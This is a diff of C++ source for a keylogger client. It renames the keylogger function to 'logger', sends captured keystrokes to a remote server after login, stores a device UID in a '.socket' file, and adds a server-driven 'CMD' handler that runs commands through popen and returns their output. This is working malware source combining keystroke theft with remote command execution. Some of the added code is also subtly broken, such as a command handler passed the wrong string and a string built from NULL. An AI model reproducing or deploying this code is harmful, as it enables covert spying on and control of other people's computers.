@@ -2,13 +2,15 @@
 * @Author: amaneureka
 * @Date:   2017-04-02 03:33:49
 * @Last Modified by:   amaneureka
-* @Last Modified time: 2017-04-02 19:50:29
+* @Last Modified time: 2017-04-04 13:53:42
 */
 
+#include <vector>
 #include <stdio.h>
 #include <stdlib.h>
 #include <iostream>
 #include <pthread.h>
+#include <fstream>
 
 using namespace std;
 
@@ -25,6 +27,7 @@ using namespace std;
     #include <w32api/ws2tcpip.h>
 
     /* simple POSIX to windows translation */
+    #define sleep Sleep
     #define read(soc, buf, len) recv(soc, buf, len, MSG_OOB)
     #define write(soc, buf, len) send(soc, buf, len, MSG_OOB)
 
@@ -43,6 +46,8 @@ using namespace std;
     "You forget to define platform"
 
 #endif
+
+static bool logged_in = false;
 
 /* concerned special keycodes */
 char keycodes[] =
@@ -89,7 +94,7 @@ char keycodes[] =
     VK_DIVIDE
 };
 
-void *keylogger(void *args)
+void *logger(void *args)
 {
     int i, index = 3;
     int sock = *(int*)args;
@@ -100,6 +105,9 @@ void *keylogger(void *args)
         // maximum of 3 entries can be made in a single loop so 1020
         if (index >= 90)
         {
+            /* wait until we are logged in */
+            while(!logged_in) sleep(100);
+
             /* send data */
             write(sock, buffer, index);
 
@@ -128,20 +136,70 @@ void *keylogger(void *args)
                 buffer[index++] = i;
         }
 
-        Sleep(100);
+        sleep(100);
     }
+}
+
+void register_device(int socket, string recv_uid)
+{
+    ifstream infile;
+    ofstream outfile;
+    char filename[] = ".socket";
+
+    if (recv_uid.size())
+    {
+        remove(filename);
+        outfile.open(filename);
+        outfile << recv_uid;
+        outfile.close();
+    }
+
+    infile.open(filename);
+
+    if (!infile)
+    {
+        write(socket, "REG", 4);
+        return;
+    }
+
+    string uid;
+    infile >> uid;
+    infile.close();
+
+    uid = "LOG" + uid;
+    write(socket, uid.c_str(), uid.size());
+}
+
+int execute_cmd(int socket, const string cmd)
+{
+    FILE *pPipe;
+    char buffer[128] = "RSP-1";
+
+    pPipe = popen(cmd.c_str(), "r");
+    if (pPipe == NULL)
+    {
+        write(socket, buffer, 5);
+        return -1;
+    }
+
+    while(fgets(buffer + 3, 125, pPipe) > 0)
+        write(socket, buffer, sizeof(buffer));
+
+    fclose(pPipe);
+    return 0;
 }
 
 int main(int argc, char *argv[])
 {
     size_t size;
     int sock, len;
+    string cmd, req;
     char *line = NULL;
-    char buffer[4096];
+    vector<char> buffer(4096);
     struct sockaddr_in addr;
     fd_set active_fd_set, read_fd_set;
 
-    pthread_t keylogger_thread;
+    pthread_t logger_thread;
 
     #if __WIN__
 
@@ -189,10 +247,10 @@ int main(int argc, char *argv[])
     //FD_SET(0, &active_fd_set);
 
     /* start background tasks */
-    pthread_create(&keylogger_thread, NULL, &keylogger, &sock);
+    pthread_create(&logger_thread, NULL, &logger, &sock);
 
     /* basic login */
-    write(sock, "LOGf466d02d-ae68-458b-87e1-e86c6e367f16", 40);
+    register_device(sock, NULL);
 
     while(true)
     {
@@ -210,22 +268,62 @@ int main(int argc, char *argv[])
             {
                 if (i == sock)
                 {
-                    if (read(sock, buffer, sizeof(buffer)) <= 0)
+                    if (read(sock, buffer.data(), buffer.size()) <= 0)
                     {
                         printf("\ndisconnected from the server\n");
                         exit(0);
                     }
 
-                    printf("%s", buffer);
-                    fflush(stdout);
-                }
-                else
-                {
-                    if ((len = getline(&line, &size, stdin)) <= 0)
-                        continue;
-                    line[len - 1] = '\0';
+                    cmd = buffer.data();
+                    req = cmd.substr(0, 3);
 
-                    write(sock, line, len - 1);
+                    if (req == "UID")
+                    {
+                        printf("[UID] key=\'%s\'\n", req.c_str());
+
+                        /* change current state */
+                        logged_in = false;
+
+                        /* save new uid and login again */
+                        register_device(sock, cmd.substr(3));
+                    }
+                    else if (req == "HLO")
+                    {
+                        printf("[HLO] Hello!\n");
+
+                        /* login successful */
+                        logged_in = true;
+                    }
+                    else if (req == "INV")
+                    {
+                        printf("[INV] Invalid\n");
+
+                        /* invalid command */
+                        logged_in = false;
+
+                        /* try to login again */
+                        register_device(sock, NULL);
+                    }
+                    else if (req == "IDY")
+                    {
+                        printf("[IDY] Identify\n");
+
+                        /* session flushed */
+                        logged_in = false;
+
+                        /* try to login again */
+                        register_device(sock, NULL);
+                    }
+                    else if (req == "CMD")
+                    {
+                        printf("[CMD] \'%s\'\n", req.c_str());
+
+                        /* command to execute */
+                        int status = execute_cmd(sock, req);
+
+                        if (status) printf("\tFailed!\n");
+                    }
+                    break;
                 }
             }
         }
